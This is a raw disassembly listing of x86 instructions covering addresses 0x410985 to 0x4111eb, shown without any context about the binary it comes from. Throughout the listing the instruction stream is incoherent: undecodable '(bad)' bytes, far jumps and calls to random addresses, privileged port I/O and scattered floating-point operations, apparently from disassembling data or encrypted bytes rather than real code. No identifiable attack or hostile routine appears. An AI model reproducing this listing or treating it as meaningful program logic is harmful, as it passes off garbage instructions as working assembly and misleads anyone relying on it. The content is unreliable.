  410985:	aad    0xcf
  410987:	(bad)  
  410988:	retf   
  410989:	lock fcmovnb st,st(4)
  41098c:	mov    ecx,0xb4d4c8bf
  410991:	ret    0xbef1
  410994:	repz inc dl
  410997:	ror    bl,cl
  410999:	pop    es
  41099a:	push   es
  41099b:	fprem1 
  41099d:	add    al,0xcb
  41099f:	fucom  st(2)
  4109a1:	in     eax,0xed
  4109a3:	out    dx,eax
  4109a4:	loop   0x410986
  4109a6:	lods   al,BYTE PTR ds:[esi]
  4109a7:	(bad)  
  4109a8:	mov    ebx,0xcae6f4cc
  4109ad:	(bad)
  4109b0:	lock mov ebp,0xdbd8f9d7
  4109b6:	fldl2e 
  4109b8:	call   ecx
  4109ba:	rol    DWORD PTR [edi],0x5
  4109bd:	or     BYTE PTR [edx],al
  4109bf:	pop    es
  4109c0:	std    
  4109c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c2:	mov    al,0xa5
  4109c4:	scas   eax,DWORD PTR es:[edi]
  4109c5:	retf   
  4109c6:	in     al,0xc5
  4109c8:	jmp    0xfaff:0xacb4c7d7
  4109cf:	mov    eax,0xbc01dfb0
  4109d4:	(bad)  
  4109d5:	(bad)  
  4109d7:	add    dh,ah
  4109d9:	call   0xe83d0bb9
  4109de:	loop   0x4109dc
  4109e0:	pop    es
  4109e1:	scas   al,BYTE PTR es:[edi]
  4109e2:	in     al,0xcb
  4109e4:	retf   0xc3cf
  4109e7:	lods   al,BYTE PTR ds:[esi]
  4109e8:	sti    
  4109e9:	ror    dh,cl
  4109eb:	call   0xca1ee9c6
  4109f0:	clc    
  4109f1:	(bad)  
  4109f2:	fdiv   st(6),st
  4109f4:	fsub   st,st(0)
  4109f6:	ret    0xfad9
  4109f9:	retf   0xd9f8
  4109fc:	aam    0x7
  4109fe:	cld    
  4109ff:	cld    
  410a00:	add    al,ah
  410a02:	repz (bad) 
  410a05:	(bad)  
  410a06:	jmp    0xea17ebda
  410a0b:	out    dx,eax
  410a0c:	lock int 0xf1
  410a0f:	aad    0xd9
  410a11:	add    dh,ch
  410a13:	lock add edx,esi
  410a16:	ror    DWORD PTR [edx],1
  410a18:	(bad)  
  410a19:	(bad)  
  410a1a:	loopne 0x4109f2
  410a1c:	jmp    ecx
  410a1e:	int3   
  410a1f:	jmp    0xeaae:0xcfedd0c9
  410a26:	mov    dl,0xe0
  410a28:	mov    ah,0xfb
  410a2a:	shr    esp,cl
  410a2c:	sti    
  410a2d:	mov    edi,0xc9b0dab6
  410a32:	jecxz  0x410a28
  410a34:	hlt    
  410a35:	sar    dl,1
  410a37:	les    eax,FWORD PTR [esi]
  410a39:	(bad)  
  410a3b:	hlt    
  410a3c:	loopne 0x410a03
  410a3e:	jmp    0xb1b2:0xe8d9dd07
  410a45:	shl    BYTE PTR [ecx-0x491e0b26],1
  410a4b:	out    0xfd,al
  410a4d:	in     eax,0xcd
  410a4f:	fdivr  st(5),st
  410a51:	ret    0xe1ef
  410a54:	out    0xe4,eax
  410a56:	loope  0x410a36
  410a58:	(bad)  
  410a59:	(bad)  
  410a5b:	fsubrp st(2),st
  410a5d:	push   cs
  410a5e:	jecxz  0x410a42
  410a60:	or     ch,ch
  410a62:	call   0xfc05cf44
  410a67:	mov    dl,0xeb
  410a69:	out    0xef,eax
  410a6b:	(bad)  
  410a6c:	enter  0xf3d8,0xed
  410a70:	fscale 
  410a72:	loopne 0x410a62
  410a74:	cmc    
  410a75:	add    ah,bh
  410a77:	test   eax,0xd9d4c8ea
  410a7d:	jmp    0xc31f1369
  410a82:	(bad)  
  410a83:	(bad)  
  410a85:	rcr    bl,cl
  410a87:	cli    
  410a88:	rcr    bl,0xda
  410a8b:	clc    
  410a8c:	call   0xc32af360
  410a91:	std    
  410a92:	mov    esi,0xc5e401c2
  410a97:	mov    esp,0xf4c1d0f5
  410a9c:	leave  
  410a9d:	fstp   st(2)
  410a9f:	int    0x1
  410aa1:	stos   DWORD PTR es:[edi],eax
  410aa2:	repz into 
  410aa4:	in     al,0xb5
  410aa6:	iret   
  410aa7:	lock stc 
  410aa9:	(bad)  [edi-0x24064f1a]
  410aaf:	(bad)  
  410ab1:	repz ret 
  410ab3:	add    ch,dh
  410ab5:	fiadd  DWORD PTR [ecx]
  410ab7:	ret    
  410ab8:	fiadd  WORD PTR [edi]
  410aba:	leave  
  410abb:	(bad)  
  410abc:	shr    bl,0xe3
  410abf:	fmul   st(1),st
  410ac1:	loop   0x410aa3
  410ac3:	retf   
  410ac4:	out    dx,eax
  410ac5:	into   
  410ac6:	rcl    ebx,1
  410ac8:	out    0xc5,eax
  410aca:	mov    ebx,0xcff7ecc6
  410acf:	std    
  410ad0:	sar    eax,cl
  410ad2:	add    esi,ebx
  410ad4:	mov    eax,0x5ebfec5
  410ad9:	clc    
  410ada:	(bad)  
  410adc:	(bad)  
  410add:	aad    0xf
  410adf:	or     esi,ebx
  410ae1:	mov    ebp,0xedacecbf
  410ae6:	div    bh
  410ae8:	mov    ah,0xd0
  410aea:	stc    
  410aeb:	clc    
  410aec:	mov    esi,0x3d0f3e9
  410af1:	(bad)  
  410af2:	(bad)  
  410af4:	out    0xd9,eax
  410af6:	jecxz  0x410aee
  410af8:	aad    0x4
  410afa:	retf   0x5e7
  410afd:	(bad)  
  410afe:	int3   
  410aff:	stc    
  410b00:	ror    esp,cl
  410b02:	repnz scas eax,DWORD PTR es:[edi]
  410b04:	lods   eax,DWORD PTR ds:[esi]
  410b05:	jmp    0xd5e7:0xb2d5c8d0
  410b0c:	stc    
  410b0d:	(bad)
  410b10:	mov    eax,0xf4cccecd
  410b15:	cld    
  410b16:	fsubrp st(4),st
  410b18:	add    cl,cl
  410b1a:	hlt    
  410b1b:	(bad)  
  410b1d:	out    0xf8,eax
  410b1f:	fcmovne st,st(2)
  410b21:	(bad)  
  410b22:	out    0xf0,eax
  410b24:	(bad)
  410b27:	rol    eax,0xce
  410b2a:	repz mov eax,0xbbd7faee
  410b30:	out    dx,eax
  410b31:	cli    
  410b32:	cld    
  410b33:	mov    ch,0xb4
  410b35:	std    
  410b36:	(bad)  
  410b38:	(bad)  
  410b3a:	jmp    0xe2e4:0xe9e4cee4
  410b41:	in     eax,dx
  410b42:	ror    ebp,1
  410b44:	ret    0xe3cd
  410b47:	loopne 0x410b15
  410b49:	aad    0xae
  410b4b:	repnz in eax,dx
  410b4d:	lds    esi,FWORD PTR [esi-0xd070107]
  410b53:	iret   
  410b54:	mov    edi,0xf4defbe5
  410b59:	test   eax,0xead8c90e
  410b5f:	loop   0x410b6d
  410b61:	mov    bl,0xf2
  410b63:	(bad)  [esi-0xc0e1943]
  410b69:	scas   eax,DWORD PTR es:[edi]
  410b6a:	icebp  
  410b6b:	out    dx,eax
  410b6c:	(bad)  
  410b6e:	iret   
  410b6f:	int3   
  410b70:	loop   0x410b33
  410b72:	into   
  410b73:	shl    bl,1
  410b75:	aam    0xd6
  410b77:	add    eax,0xefdfdbf2
  410b7c:	out    0xc8,eax
  410b7e:	(bad)  
  410b81:	int3   
  410b82:	fucomp st(3)
  410b84:	retf   
  410b85:	fsub   st(6),st
  410b87:	sar    BYTE PTR [edx-0x373b3137],0xdd
  410b8e:	into   
  410b8f:	repz ret 0xd7e0
  410b93:	fcomi  st,st(5)
  410b95:	mov    esi,0x6c403c7
  410b9a:	jmp    0xeefd:0x60dff01
  410ba1:	lock in al,dx
  410ba3:	sar    DWORD PTR [esi+ebp*8-0x1b050d31],cl
  410baa:	fdivr  st,st(3)
  410bac:	repnz (bad) 
  410baf:	call   esi
  410bb1:	enter  0xe1cd,0xfd
  410bb5:	rol    esi,1
  410bb7:	add    ebp,ecx
  410bb9:	(bad)  
  410bba:	out    0xf6,al
  410bbc:	add    eax,0xebe8d90f
  410bc1:	mov    edi,0xd3d0e8ec
  410bc6:	mov    dh,0xcc
  410bc8:	enter  0xbace,0xb4
  410bcc:	dec    edi
  410bce:	mov    esi,0xf7e8ffde
  410bd3:	hlt    
  410bd4:	in     eax,0xec
  410bd6:	out    0xc5,al
  410bd8:	loope  0x410bb7
  410bda:	std    
  410bdb:	std    
  410bdc:	add    eax,0xca0cfde0
  410be1:	mov    ebp,0xe5e5f2e6
  410be6:	in     al,0xbb
  410be8:	test   al,0xdb
  410bea:	hlt    
  410beb:	out    dx,eax
  410bec:	jmp    0xf420d7e8
  410bf1:	in     al,dx
  410bf2:	iret   
  410bf3:	out    0xe0,al
  410bf5:	faddp  st(4),st
  410bf7:	fadd   st,st(0)
  410bf9:	ror    ecx,1
  410bfb:	(bad)  
  410bfd:	mov    BYTE PTR [ecx],0xd9
  410c00:	out    0xb8,eax
  410c02:	ret    0xddc0
  410c05:	retf   
  410c06:	mov    ch,0xb4
  410c08:	loopne 0x410c03
  410c0a:	sti    
  410c0b:	cli    
  410c0c:	shl    DWORD PTR [esi-0x311e0211],cl
  410c12:	out    0xe6,eax
  410c14:	loope  0x410be6
  410c16:	add    ah,bl
  410c18:	cli    
  410c19:	(bad)  
  410c1b:	add    ebx,esp
  410c1d:	(bad)  
  410c1f:	jmp    0x410bfa
  410c21:	in     al,0xb8
  410c23:	rol    edi,1
  410c25:	aam    0xb4
  410c27:	(bad)  
  410c28:	iret   
  410c29:	ror    ch,1
  410c2b:	retf   
  410c2c:	jmp    0xdd0abf15
  410c31:	mov    ebx,0xe3b8df02
  410c36:	inc    ah
  410c38:	add    ch,ah
  410c3a:	cld    
  410c3b:	sti    
  410c3c:	loop   0x410c4d
  410c3e:	iret   
  410c3f:	ror    ebp,0xc0
  410c42:	jmp    0xf0ed:0xb1cfc9f0
  410c49:	out    dx,eax
  410c4a:	cmc    
  410c4b:	fsubp  st(0),st
  410c4d:	fstp   st(1)
  410c4f:	(bad)  
  410c50:	fadd   DWORD PTR [ebx]
  410c52:	mov    edi,0x4bdddf9
  410c57:	fucom  st(7)
  410c59:	loop   0x410c35
  410c5b:	(bad)  
  410c5d:	push   es
  410c5e:	add    bl,ch
  410c60:	jmp    0xd0c0:0xd0b0c1e8
  410c67:	(bad)  
  410c68:	jmp    0x410c1d
  410c6a:	enter  0xc5f9,0xd6
  410c6e:	rcl    dl,cl
  410c70:	add    edx,ebp
  410c72:	sar    bh,cl
  410c74:	add    cl,bl
  410c76:	(bad)  
  410c77:	cmc    
  410c78:	std    
  410c79:	or     esi,edi
  410c7b:	pop    es
  410c7c:	(bad)  
  410c7e:	leave  
  410c7f:	in     al,dx
  410c80:	jmp    0xb6c9:0xc3bcaed9
  410c87:	hlt    
  410c88:	iret   
  410c89:	scas   eax,DWORD PTR es:[edi]
  410c8a:	int3   
  410c8b:	mov    al,0xac
  410c8d:	sti    
  410c8e:	leave  
  410c8f:	in     al,dx
  410c90:	clc    
  410c91:	(bad)  
  410c92:	repz out 0xc3,al
  410c95:	ffreep st(7)
  410c97:	add    eax,0xc8fbc4c7
  410c9c:	add    BYTE PTR [eax],cl
  410c9e:	cli    
  410c9f:	out    0xe9,al
  410ca1:	test   al,0xcb
  410ca3:	retf   0xd3f1
  410ca6:	mov    al,0xf7
  410ca8:	jmp    0xb641035e
  410cad:	les    esi,FWORD PTR [esi-0x441240e]
  410cb3:	lock rol BYTE PTR ds:0xc90703f8,1
  410cba:	loopne 0x410cc5
  410cbc:	fld    st(6)
  410cbe:	fmul   DWORD PTR [ecx]
  410cc0:	push   es
  410cc1:	lods   eax,DWORD PTR ds:[esi]
  410cc2:	test   edx,0xfbaae4b0
  410cc8:	mov    ch,0xe1
  410cca:	out    dx,eax
  410ccb:	fmul   st,st(0)
  410ccd:	into   
  410cce:	out    dx,al
  410ccf:	cli    
  410cd0:	lock ror edi,1
  410cd3:	add    dl,dh
  410cd5:	in     al,0x4
  410cd7:	loope  0x410cb5
  410cd9:	cli    
  410cda:	cld    
  410cdb:	retf   0xc5cb
  410cde:	out    0xe1,al
  410ce0:	retf   0xcbc6
  410ce3:	ret    
  410ce4:	in     eax,dx
  410ce5:	enter  0xf0c9,0xb2
  410ce9:	out    0xae,al
  410ceb:	(bad)  
  410cec:	(bad)  
  410ced:	(bad)  
  410cee:	out    dx,al
  410cef:	(bad)  
  410cf0:	(bad)  
  410cf2:	rcr    ah,1
  410cf4:	std    
  410cf5:	add    esp,edi
  410cf7:	repz loop 0x410ce4
  410cfa:	jmp    0x410d02
  410cfc:	(bad)  
  410cfe:	(bad)  
  410cff:	fld    DWORD PTR [ecx]
  410d01:	lds    esp,FWORD PTR [esi-0x3a1e324d]
  410d07:	out    0xcd,al
  410d09:	mov    edx,0xdbe4dbd7
  410d0e:	sar    eax,1
  410d10:	cli    
  410d11:	add    dh,BYTE PTR [esi-0x41a4b1a]
  410d17:	(bad)  
  410d18:	out    0xe1,al
  410d1a:	inc    dh
  410d1c:	or     bh,bl
  410d1e:	add    al,0xd9
  410d20:	fild   QWORD PTR [edx-0x394d3d43]
  410d26:	mov    bl,0xac
  410d28:	out    dx,al
  410d29:	repnz out dx,al
  410d2b:	mov    dh,0xba
  410d2d:	int3   
  410d2e:	retf   0xf8d6
  410d31:	fsubr  st,st(7)
  410d33:	fcmovb st,st(7)
  410d35:	loopne 0x410d22
  410d37:	or     edx,ebp
  410d39:	add    al,0xc4
  410d3b:	(bad)  
  410d3d:	loopne 0x410d21
  410d3f:	adc    cl,BYTE PTR [ebx]
  410d41:	iret   
  410d42:	into   
  410d43:	int    0xea
  410d45:	icebp  
  410d46:	loope  0x410d0b
  410d48:	mov    cl,0xfa
  410d4a:	retf   
  410d4b:	mov    cl,0xc6
  410d4d:	(bad)  
  410d4f:	mov    ebp,0xe7f9faba
  410d54:	cld    
  410d55:	push   edx
  410d57:	fadd   QWORD PTR [ecx+esi*8]
  410d5a:	shl    dh,1
  410d5c:	(bad)  
  410d5d:	aam    0x7
  410d5f:	in     al,dx
  410d60:	or     cl,ch
  410d62:	(bad)
  410d65:	retf   
  410d66:	aam    0xb6
  410d68:	out    dx,al
  410d69:	lock mov bh,0xcb
  410d6c:	fnstcw WORD PTR [edi-0xe303c3c]
  410d72:	rol    DWORD PTR [ecx],1
  410d74:	mov    esp,0xebc0c7fb
  410d79:	rol    DWORD PTR [edi],1
  410d7b:	stc    
  410d7c:	imul   bh
  410d7e:	bswap  esp
  410d80:	retf   0xf0b2
  410d83:	fdivr  st(1),st
  410d85:	mov    esp,0xc4e8dac5
  410d8a:	out    dx,al
  410d8b:	repz mov esi,0xead5dbd8
  410d91:	add    dl,ch
  410d93:	rol    BYTE PTR [ebx],cl
  410d95:	shl    esp,0xd1
  410d98:	inc    DWORD PTR [eax]
  410d9a:	ror    eax,0xce
  410d9d:	into   
  410d9e:	in     al,0xda
  410da0:	or     al,0xbd
  410da2:	loope  0x410d90
  410da4:	loop   0x410d62
  410da6:	xlat   BYTE PTR ds:[ebx]
  410da7:	(bad)  
  410da9:	jmp    0xc9cc:0xfeced7e0
  410db0:	mov    ah,0xf1
  410db2:	pop    es
  410db3:	int    0xe1
  410db5:	idiv   bh
  410db7:	loope  0x410d83
  410db9:	(bad)  
  410dbb:	(bad)  
  410dbc:	jmp    0x410dc7
  410dbe:	iret   
  410dbf:	or     cl,BYTE PTR [edx]
  410dc1:	test   eax,0xf7edc0f7
  410dc6:	retf   0xe4e5
  410dc9:	rcl    dl,1
  410dcb:	fcom   st(1)
  410dcd:	in     al,0xda
  410dcf:	mov    ch,0xbc
  410dd1:	cli    
  410dd2:	icebp  
  410dd3:	cmc    
  410dd4:	shl    ebx,cl
  410dd6:	(bad)  
  410dd8:	add    al,0xd8
  410dda:	or     dh,ch
  410ddc:	fmul   st,st(0)
  410dde:	lds    ecx,FWORD PTR [edx]
  410de0:	fnstcw WORD PTR [edi-0x48493558]
  410de6:	out    dx,al
  410de7:	shl    DWORD PTR [ecx-0x2e2b201f],cl
  410ded:	(bad)  
  410def:	sti    
  410df0:	(bad)  
  410df1:	fcomi  st,st(5)
  410df3:	add    ebp,esi
  410df5:	(bad)  
  410df6:	aam    0xe3
  410df8:	fild   WORD PTR ds:0xebf6fafc
  410dfe:	loopne 0x410de6
  410e00:	call   0xf325f2d4
  410e05:	(bad)  
  410e06:	leave  
  410e07:	cli    
  410e08:	mov    edx,0xc8cab1db
  410e0d:	int3   
  410e0e:	jmp    0xe33fc9db
  410e13:	mov    edi,0xe6d7d007
  410e18:	(bad)  
  410e19:	icebp  
  410e1a:	sar    dl,1
  410e1c:	test   BYTE PTR [edi],0xe5
  410e1f:	fmul   st,st(6)
  410e21:	out    0xbe,eax
  410e23:	rol    bh,cl
  410e25:	mov    ch,0xd3
  410e27:	loop   0x410e1e
  410e29:	mov    al,0xe0
  410e2b:	enter  0xeceb,0xf1
  410e2f:	shr    eax,cl
  410e31:	iret   
  410e32:	rcr    ecx,1
  410e34:	rcl    esi,0xf9
  410e37:	faddp  st(6),st
  410e39:	fistp  QWORD PTR [esi+0x8c5fcc4]
  410e3f:	repz add DWORD PTR [ebp-0x541a120e],edi
  410e46:	lock icebp 
  410e48:	aad    0xd7
  410e4a:	out    0xec,al
  410e4c:	out    dx,al
  410e4d:	rcl    cl,cl
  410e4f:	repz leave 
  410e51:	fstp   TBYTE PTR [edi-0xd123f11]
  410e57:	idiv   BYTE PTR [eax+0x7fde8e3]
  410e5d:	cld    
  410e5e:	enter  0xed0f,0xb9
  410e62:	mov    cl,0xd3
  410e64:	shr    eax,0xf4
  410e67:	retf   0xc5f6
  410e6a:	out    0xcf,al
  410e6c:	into   
  410e6d:	fidivr DWORD PTR [esi-0x1011fe17]
  410e73:	out    0xe2,al
  410e75:	repnz shl eax,0x4
  410e79:	(bad)  
  410e7a:	in     al,0xfe
  410e7c:	or     bh,bl
  410e7e:	cli    
  410e7f:	loope  0x410e62
  410e81:	in     eax,dx
  410e82:	out    dx,al
  410e83:	int3   
  410e84:	scas   eax,DWORD PTR es:[edi]
  410e85:	imul   al
  410e87:	out    dx,al
  410e88:	xlat   BYTE PTR ds:[ebx]
  410e89:	enter  0xefec,0xfe
  410e8d:	retf   
  410e8e:	add    edx,edi
  410e90:	(bad)  
  410e92:	mov    esi,0xebdad5d2
  410e97:	test   BYTE PTR [ecx],0xe0
  410e9a:	loopne 0x410e92
  410e9c:	add    edx,esp
  410e9e:	jmp    0xe8e2:0xefd3e10d
  410ea5:	(bad)
  410ea8:	fcomi  st,st(2)
  410eaa:	retf   0xd3eb
  410ead:	retf   
  410eae:	into   
  410eaf:	cli    
  410eb0:	fild   WORD PTR [ecx]
  410eb2:	mov    ecx,0xe4e402de
  410eb7:	add    al,0xdc
  410eb9:	rcl    ch,1
  410ebb:	(bad)  
  410ebc:	cld    
  410ebd:	hlt    
  410ebe:	push   cs
  410ebf:	iret   
  410ec0:	jmp    0x410e90
  410ec2:	lods   eax,DWORD PTR ds:[esi]
  410ec3:	lock shl DWORD PTR [ebx-0x2d0a2d3c],1
  410eca:	(bad)  
  410ecc:	aam    0xd2
  410ece:	(bad)  
  410ecf:	fdiv   QWORD PTR [esi+edi*4-0x200721ff]
  410ed6:	cld    
  410ed7:	sti    
  410ed8:	icebp  
  410ed9:	out    0xc5,al
  410edb:	loop   0x410ecb
  410edd:	push   es
  410ede:	adc    edi,ecx
  410ee0:	loopne 0x410eae
  410ee2:	mov    al,0xb0
  410ee4:	shr    esp,cl
  410ee6:	mov    bh,0xeb
  410ee8:	iret   
  410ee9:	repz (bad) 
  410eec:	mov    edi,0xdce2f8b3
  410ef1:	fpatan 
  410ef3:	shr    dh,1
  410ef5:	jecxz  0x410ef4
  410ef7:	clc    
  410ef8:	sti    
  410ef9:	(bad)  
  410efa:	fld    st(0)
  410efc:	into   
  410efd:	(bad)
  410f00:	in     al,dx
  410f01:	lock (bad) 
  410f03:	(bad)  
  410f04:	fsubrp st(0),st
  410f06:	aam    0xf6
  410f08:	(bad)  
  410f09:	mov    ebx,0xebe8b6b4
  410f0e:	fadd   st,st(3)
  410f10:	faddp  st(3),st
  410f12:	loopne 0x410ef6
  410f14:	out    0xd8,eax
  410f16:	ret    0xf2c7
  410f19:	cld    
  410f1a:	rol    BYTE PTR [ebx+ecx*1],1
  410f1d:	loopne 0x410f25
  410f1f:	jmp    0xb421e30c
  410f24:	fsubp  st(1),st
  410f26:	les    esi,FWORD PTR [edx-0x4420350e]
  410f2c:	fdivr  DWORD PTR [ecx-0x2b252f12]
  410f32:	mov    eax,0xbef1cef4
  410f37:	rol    BYTE PTR [edi+eax*1],cl
  410f3a:	retf   0xd408
  410f3d:	or     DWORD PTR [eax],ecx
  410f3f:	add    DWORD PTR [edi],ecx
  410f41:	lock stos BYTE PTR es:[edi],al
  410f43:	ror    ebx,0xe0
  410f46:	loop   0x410f17
  410f48:	shl    edi,cl
  410f4a:	(bad)  
  410f4b:	sti    
  410f4c:	cli    
  410f4d:	in     eax,dx
  410f4e:	retf   0xf0ec
  410f51:	shl    ebx,cl
  410f53:	shl    bl,1
  410f55:	cmc    
  410f56:	mov    esi,0xf9fedce5
  410f5b:	xlat   BYTE PTR ds:[ebx]
  410f5c:	iret   
  410f5d:	into   
  410f5e:	out    0x4,al
  410f60:	fsubr  DWORD PTR [eax-0x500a2c42]
  410f66:	mov    al,0xed
  410f68:	in     al,dx
  410f69:	mov    ah,0xd7
  410f6b:	fldln2 
  410f6d:	mov    eax,0xe2b8f5b9
  410f72:	rol    DWORD PTR [esi],0xda
  410f75:	fstp   st(5)
  410f77:	ret    0xeaeb
  410f7a:	or     ebx,esi
  410f7c:	call   0xc9310d6e
  410f81:	(bad)  
  410f82:	in     al,dx
  410f83:	fnsave [eax-0x371f3a15]
  410f89:	(bad)  
  410f8a:	icebp  
  410f8b:	mov    ebx,0xbabcfde5
  410f90:	idiv   cl
  410f92:	jecxz  0x410f96
  410f94:	loope  0x410f52
  410f96:	mov    ebp,0x401dcd1
  410f9b:	jmp    0x290884
  410fa0:	clc    
  410fa1:	int3   
  410fa2:	enter  0xe7d3,0xea
  410fa6:	mov    ah,0xf5
  410fa8:	in     al,dx
  410fa9:	mov    edx,0xdab0b7c4
  410fae:	in     eax,dx
  410faf:	enter  0xdccc,0xf2
  410fb3:	fcmovbe st,st(6)
  410fb5:	loop   0x410f88
  410fb7:	faddp  st(5),st
  410fb9:	add    ecx,DWORD PTR [ecx]
  410fbb:	loope  0x410f83
  410fbd:	out    dx,eax
  410fbe:	int    0xcd
  410fc0:	int    0xc8
  410fc2:	ret    0xbdcb
  410fc5:	div    ebx
  410fc7:	(bad)  
  410fc9:	mov    ecx,0xf3d4d2f6
  410fce:	fcmovne st,st(0)
  410fd0:	lock sar edx,1
  410fd3:	loop   0x410fa7
  410fd5:	mov    edi,0xe801c6c6
  410fda:	(bad)  
  410fdb:	pand   mm1,QWORD PTR [eax]
  410fde:	add    BYTE PTR ds:0xc8dfc313,al
  410fe4:	repz fdivr st(1),st
  410fe7:	cli    
  410fe8:	ror    ebx,cl
  410fea:	retf   
  410feb:	mov    ecx,0x2d0bec8
  410ff0:	fld    st(3)
  410ff2:	stc    
  410ff3:	in     eax,dx
  410ff4:	aam    0xbb
  410ff6:	add    eax,0xf6caddde
  410ffb:	mul    esp
  410ffd:	(bad)  
  410ffe:	fmul   st(6),st
  411000:	out    0xcc,al
  411002:	xlat   BYTE PTR ds:[ebx]
  411003:	retf   0xecce
  411006:	int3   
  411007:	jmp    0xdaf6:0xd4f8c5b6
  41100e:	out    dx,eax
  41100f:	mov    ebx,0xd6e7cdb9
  411014:	into   
  411015:	add    al,BYTE PTR [ecx]
  411017:	retf   
  411018:	ffree  st(1)
  41101a:	dec    eax
  41101c:	jmp    0xf1b8:0x6cd09fe
  411023:	scas   eax,DWORD PTR es:[edi]
  411024:	int    0xc2
  411026:	rcl    bl,0xc0
  411029:	call   0xcf07e929
  41102e:	fyl2x  
  411030:	leave  
  411031:	lock ret 0xe7e1
  411035:	(bad)  
  411037:	mov    ebp,0xf5dfc1ff
  41103c:	leave  
  41103d:	push   es
  41103e:	clc    
  41103f:	fild   WORD PTR [eax]
  411041:	mov    ecx,0xbdeca9ce
  411046:	jmp    0xcaf0:0xb0f6c0ea
  41104d:	icebp  
  41104e:	cli    
  41104f:	jmp    0xd9ec:0xd1d5f4c8
  411056:	xlat   BYTE PTR ds:[ebx]
  411057:	(bad)  
  411058:	out    0xfc,eax
  41105a:	(bad)  
  41105b:	cli    
  41105c:	out    0xeb,al
  41105e:	cli    
  41105f:	add    DWORD PTR [ecx],eax
  411061:	retf   0xa9c0
  411064:	fidivr WORD PTR [esp+eax*8-0x4f440d1b]
  41106b:	call   0xcaf60542
  411070:	mov    ah,0xd0
  411072:	ret    
  411073:	rcr    ebp,1
  411075:	rcr    ebx,1
  411077:	out    0xeb,eax
  411079:	fdivr  st(4),st
  41107b:	les    ecx,FWORD PTR [esi]
  41107d:	fdiv   st(5),st
  41107f:	(bad)  
  411081:	lods   al,BYTE PTR ds:[esi]
  411082:	in     al,0xae
  411084:	mov    bl,0xe0
  411086:	sti    
  411087:	loopne 0x41107a
  411089:	shl    ah,0xb1
  41108c:	out    dx,al
  41108d:	stc    
  41108e:	mov    edi,0xd3dcb8f8
  411093:	mov    edi,0xffd2c1e2
  411098:	(bad)  
  41109a:	out    0xc1,al
  41109c:	loop   0x4110a7
  41109e:	jecxz  0x4110a5
  4110a0:	out    0xc3,eax
  4110a2:	loope  0x411092
  4110a4:	mov    bh,0xe6
  4110a6:	mov    dh,0xe6
  4110a8:	mov    dh,0xe5
  4110aa:	aam    0xf3
  4110ac:	sar    BYTE PTR [edx-0x9162917],cl
  4110b2:	stc    
  4110b3:	(bad)  
  4110b5:	add    al,0xec
  4110b7:	(bad)  
  4110b9:	add    al,0xef
  4110bb:	sti    
  4110bc:	loop   0x4110a0
  4110be:	jmp    0xbebe:0xbfbfe8c1
  4110c5:	shr    ebx,cl
  4110c7:	in     eax,0xc2
  4110c9:	int3   
  4110ca:	mov    al,0xf5
  4110cc:	ror    edx,cl
  4110ce:	enter  0x2c8,0xda
  4110d2:	fsub   st,st(7)
  4110d4:	in     eax,0xe2
  4110d6:	sar    edx,1
  4110d8:	not    al
  4110da:	shl    dh,0xe
  4110dd:	fdiv   st(7),st
  4110df:	repnz enter 0xd0ad,0xb2
  4110e4:	loope  0x411099
  4110e6:	enter  0xbbad,0xb2
  4110ea:	mov    dh,0xc9
  4110ec:	mov    al,0xeb
  4110ee:	mov    eax,0xfac1edeb
  4110f3:	out    0xe2,eax
  4110f5:	loopne 0x4110c9
  4110f7:	loop   0x4110ca
  4110f9:	clc    
  4110fa:	add    DWORD PTR [edi],ecx
  4110fc:	add    ah,ch
  4110fe:	iret   
  4110ff:	in     al,0xc
  411101:	retf   
  411102:	shl    DWORD PTR [edx-0x1b171f30],cl
  411108:	shl    esp,0xbb
  41110b:	(bad)
  41110e:	icebp  
  41110f:	sti    
  411110:	loope  0x4110eb
  411112:	int3   
  411113:	cmc    
  411114:	lock (bad) 
  411117:	fidivr WORD PTR [esp+eiz*8-0x32153b0a]
  41111e:	or     ebx,ecx
  411120:	out    0xc6,al
  411122:	lock jmp 0xb1d7:0xe8cfd1f7
  41112a:	(bad)
  41112d:	(bad)  
  41112e:	bnd jmp 0x4110e1
  411131:	aad    0xf0
  411133:	ret    0xfff1
  411136:	in     eax,0xf4
  411138:	retf   
  411139:	ror    DWORD PTR [ebx],1
  41113b:	cmc    
  41113c:	or     bl,ah
  41113e:	out    0xe0,eax
  411140:	int3   
  411141:	int3   
  411142:	icebp  
  411143:	shr    DWORD PTR [ebp-0x19112e13],1
  411149:	rcl    bh,0xe6
  41114c:	lock (bad) 
  41114e:	fprem1 
  411150:	into   
  411151:	mov    bh,0xd4
  411153:	mov    ch,0xff
  411155:	mov    BYTE PTR [eax],0xc2
  411158:	out    0x6,al
  41115a:	call   0xe847ed3c
  41115f:	or     bl,bh
  411161:	enter  0xedaa,0xce
  411165:	shl    BYTE PTR [eax-0x37461625],1
  41116b:	int3   
  41116c:	mov    ah,0xd2
  41116e:	(bad)  
  411170:	fcmovne st,st(7)
  411172:	int3   
  411173:	mov    eax,0xc2c5ffd6
  411178:	jmp    0xe550f058
  41117d:	in     al,0xf3
  41117f:	in     al,0xcf
  411181:	(bad)  
  411182:	mov    dl,0xc3
  411184:	mov    dh,0xab
  411186:	into   
  411187:	shl    bh,cl
  411189:	iret   
  41118a:	sti    
  41118b:	(bad)  
  41118d:	in     eax,0xde
  41118f:	fcmovbe st,st(0)
  411191:	fiadd  WORD PTR [ecx]
  411193:	sar    al,cl
  411195:	add    al,0xd9
  411197:	not    dh
  411199:	pop    es
  41119a:	enter  0xbcdc,0xeb
  41119e:	(bad)  
  41119f:	in     al,dx
  4111a0:	or     DWORD PTR [edx-0x18314154],ebp
  4111a6:	jmp    0xb5f3:0xcecae6d0
  4111ad:	(bad)  
  4111ae:	stc    
  4111af:	loop   0x41116c
  4111b1:	dec    ah
  4111b3:	lock fdivp st(5),st
  4111b6:	ret    0xf0c1
  4111b9:	(bad)  
  4111ba:	fsub   st,st(7)
  4111bc:	loop   0x41119a
  4111be:	out    dx,al
  4111bf:	into   
  4111c0:	jmp    0xc71dbab0
  4111c5:	xlat   BYTE PTR ds:[ebx]
  4111c6:	shr    dl,cl
  4111c8:	mov    al,0xe9
  4111ca:	in     al,dx
  4111cb:	out    dx,al
  4111cc:	mov    esi,0xe103eac4
  4111d1:	in     eax,dx
  4111d2:	int3   
  4111d3:	ret    
  4111d4:	fild   DWORD PTR [ebx]
  4111d6:	mov    esi,0xfa08c5e0
  4111db:	loopne 0x4111d3
  4111dd:	retf   0xc5fa
  4111e0:	(bad)  
  4111e2:	out    0xe6,eax
  4111e4:	rol    ch,1
  4111e6:	leave  
  4111e7:	out    dx,al
  4111e8:	aam    0xbb
  4111ea:	out    dx,eax
  4111eb:	shl    cl,1
